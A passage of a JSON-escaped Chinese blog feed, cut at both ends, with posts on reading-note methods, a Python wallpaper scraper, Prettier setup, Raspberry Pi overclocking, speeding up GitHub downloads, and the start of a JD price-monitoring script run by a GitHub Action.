完成这类型的读书笔记。</p>\n<h4>具体操作</h4>\n<ol>\n<li>用自己的话对整本书的内容进行概括性的描写。切勿写太多废话，尽量把最打动自己的地方结合整本书的内容进行记录。</li>\n<li>书评的第二部分内容可以大致描写一下自己的想法。可以是关于作者某个观点的想法，或者对整本书的总体看法。我个人喜欢在描写自己想法的时候，尽量按照作者写这本书的语言风格来写，这样可以锻炼到自己的文笔。可能很多人会害怕自己的文字底蕴比不上作者，但只要我们多点尝试将作者所表达的某一个观点与自己息息相关的生活、想法联系在一起，并进行输出，那我们的文字输出水平也会越来越强大。记住，当我们以文字输出、思想输出作为写读书笔记的目的时，输出的动作会自然而然地加深我们对书籍内容的理解。</li>\n<li>写下目标和行动。可以写下看完书后对自己的启发以及想要实现的目标。最后写下读完这本作品之后，自己要付诸的行动。</li>\n</ol>\n<p>书评读书笔记有着独特风格的应用文体，是我们自己对书中观点和自己想法的整合理解。虽说书评笔记在大多数情况下会记录下我们当时的感受，但当我们过一段时间再回首看看自己写的书评笔记，或许会有新的感悟出现。第一次写下的书评笔记是自己与书籍的深入交流。当我们有了更多阅历，回来再看自己的书评或者把一些新的想法增添到书评笔记里时，我们就相当于和以前的自己做了一次跨时空的交流。</p>\n<h3>RIA 便签读书法</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8sfdb34tcvciqaaig.jpeg\"></figure><p>RIA 便签读书法的重点是在于 RIA，即是 Read 阅读理解，Interpretation 个人诠释，Appropriation 应用方法。RIA 便签读书法能够快速让我们的个人经验与阅读书籍后的知识点产生链接，并且催化出实际的行动计划。当我们看到书中的一段文字、提到的一个方法/思路的时候，可以用 RIA 三张便签读书法对知识点进一步分解。</p>\n<p>原本的 RIA 便签读书法是利用三张不同颜色的便利贴，然后分别在便利贴上重述知识点，描述自己的相关经验，以及应用方法。同样，RIA 便签读书法可以直接运用在电子笔记上，我们只需要把纸质的便利贴换成有三个区分空间的电子笔记的页面即可，操作十分简单。在电子笔记中，参照上文提及的 RIA 具体操作，写出自己对文段的理解，诠释和应用。最后在电子文档里记好笔记对应的文字，或者直接截图、照相相应页面到 RIA 笔记下面，方便以后自己翻阅。</p>\n<p>我个人还是会选择 Microsoft OneNote 进行 RIA 便签读书法，因为它可以直接插入表格，而在表格中也可以随意添加图片。</p>\n<p>具体操作：</p>\n<ul>\n<li>R：摘抄下阅读片段</li>\n<li>I：用自己的表达将知识点重述</li>\n<li>A1：描述自己的相关经验</li>\n<li>A2：以后如何应用</li>\n</ul>\n<h3>其他记录</h3>\n<h4><strong>记录读书进度</strong></h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8sflb34tcuopj7s7g.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8sftb34tcvciqaaj0.jpeg\"></figure><p>由于我平日里经常在一段规划好的阅读时间里同时读好几本书，所以我会记录下正在读的书有哪些，不然很多书读着读着就会消失不见。同样，我也会记录下读过的书。</p>\n<p>记录在读和读过的书籍都属于回望式的记录。两种方式都是把正在读的书全部写下来，读完了，就打个勾或者标注一下。这样一个记录可以建立一个个锚点，当我需要回看的时候，也能马上知道自己曾经阅读过什么书，还有哪些书没有看完。当我们读过很多书之后，看着熙来攘往的读书记录表，也会有一种莫大的成就感，鼓励我们继续坚持阅读。</p>\n<p>我记录读书的进度很简单，先是随时手写已经读完的书在一个小本子上，然后在每一年的最后一天，用 Excel 表格进行最后整理和记录。</p>\n<h4><strong>记录读书计划，建立自己的知识系统</strong></h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8sg5b34tcuopj7s80.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4m8sgdb34tcu4buqvsg.jpeg\"></figure><p>作为一个热爱读书的人，我自己还会进行前瞻式的记录，也就是提前制定自己的读书计划。特别是当我需要对一个领域进行钻研的时候，我会设立一个为期 1-3 个月的读书计划，然后进行主题阅读。主题阅读无外乎就是找到适合的书目，将书单排列出来，一本一本的去读。</p>\n<p>我习惯用 Excel 表格制定一个全方面的主题阅读计划。每次当我遇到新的书目，我都可以快速地将新的书目添加进去表格内，实时更新我的主题阅读情况。</p>\n<h3>总结</h3>\n<p>阅读和学习往往是探索真理和形成三观的最有利途径。人的记忆力是有限的，读书笔记无疑可以使自己对读过的书有更进一步的印象和理解。我们阅读的每一本书都有自己的中心重点，而读书笔记可以让我们记录下这些对我们有用的知识和思想。</p>\n<p>上面我提到的每种电子读书笔记法，都非常强调写出自己对书中观点或者知识的思考和应用，真正消化书中的知识，把书里的信息变为自己受益终身的精神财富，这才是我们做读书笔记的本质。</p>\n<p>以上就是我平日里用得最多的读书笔记方法，望我的笔记方法能带给大家有价值的参考，祝大家早日把读过的书籍都转化成脑里的知识。</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68535"},{"title":"使用 Python 爬取故宫壁纸","date":"2021-07-17 05:55:00","description":"\n<p>我非常喜欢故宫壁纸，但是一张一张下载的速度就太慢了。</p>\n<p>于是，我就写了个简单的 Python 小程序自动爬取故宫壁纸。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%A3%E7%A0%81\" class=\"headerlink\" title=\"代码\"></a>代码</h2>\n<p>首先，我们通过简单的查看，知道故宫壁纸的页面并没有使用 JavaScript 载入。</p>\n<p>但是故宫壁纸很多，所以还需要分类。</p>\n<p>故宫壁纸大多都是以分类开头，如 <code>爱上紫禁城 紫藤</code>, <code>清   虚谷紫藤金鱼图轴（局部）</code> 等等，所以一般只需要做个简单的 <code>startswith()</code> 判断就 OK 了。</p>\n<p>很多壁纸的标题都是一样的，所以还可以使用 <code>random</code> 库在文件名末尾追加一个随机数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests, bs4, time, random</span><br><span class=\"line\">path = <span class=\"string\">\"./wallpaper/爱上紫禁城\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">catch = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">119</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    url = <span class=\"string\">\"https://www.dpm.org.cn/lights/royal/p/{}.html\"</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">    <span class=\"comment\"># 发送请求</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># 设定页面编码为 UTF-8</span></span><br><span class=\"line\">    response.encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 从 HTML 中解析数据</span></span><br><span class=\"line\">    soup = bs4.BeautifulSoup(response.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">    image = soup.find_all(name=<span class=\"string\">\"div\"</span>, class_=<span class=\"string\">\"pic\"</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 循环输出图片</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> image:</span><br><span class=\"line\">        catch = catch + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"comment\"># 获得壁纸名称</span></span><br><span class=\"line\">        <span class=\"comment\"># 分类，不是以【爱上紫禁城】开头的壁纸都忽略</span></span><br><span class=\"line\">        img_name = n.a.img[<span class=\"string\">\"title\"</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> img_name.startswith(<span class=\"string\">\"明\"</span>):</span><br><span class=\"line\">            print(<span class=\"string\">\"{}. {}\"</span>.<span class=\"built_in\">format</span>(catch, n.a.img[<span class=\"string\">\"title\"</span>]))</span><br><span class=\"line\">            <span class=\"comment\"># 组合获得壁纸页面</span></span><br><span class=\"line\">            url_1080 = <span class=\"string\">\"https://www.dpm.org.cn\"</span> + n.a[<span class=\"string\">\"href\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 请求高清版网页</span></span><br><span class=\"line\">            response_img = requests.get(url_1080)</span><br><span class=\"line\">            <span class=\"comment\"># 再次解析</span></span><br><span class=\"line\">            soup_img = bs4.BeautifulSoup(response_img.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 获取页面中的图片</span></span><br><span class=\"line\">            data = soup_img.find_all(name=<span class=\"string\">\"img\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 获得壁纸图片的链接</span></span><br><span class=\"line\">            img_url = data[<span class=\"string\">\"src\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 保存图片</span></span><br><span class=\"line\">            pic = requests.get(img_url).content</span><br><span class=\"line\">            file_name = path + img_name + <span class=\"string\">\"-\"</span> + <span class=\"built_in\">str</span>(random.randint(<span class=\"number\">100000</span>, <span class=\"number\">999999</span>)) + <span class=\"string\">\".jpg\"</span></span><br><span class=\"line\">            <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, <span class=\"string\">\"wb\"</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(pic)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"!Ignore: \"</span> + img_name)</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>我把一些我下载下来的壁纸放在了 <a href=\"https://t.yfun.top/dpm-wallpaper\">这里</a>，可以直接预览并下载。</p>\n<p><del>OK，又水了一篇文（</del></p>\n","link":"https://blog.yfun.top/posts/2021/dpm-wallpaper/"},{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span 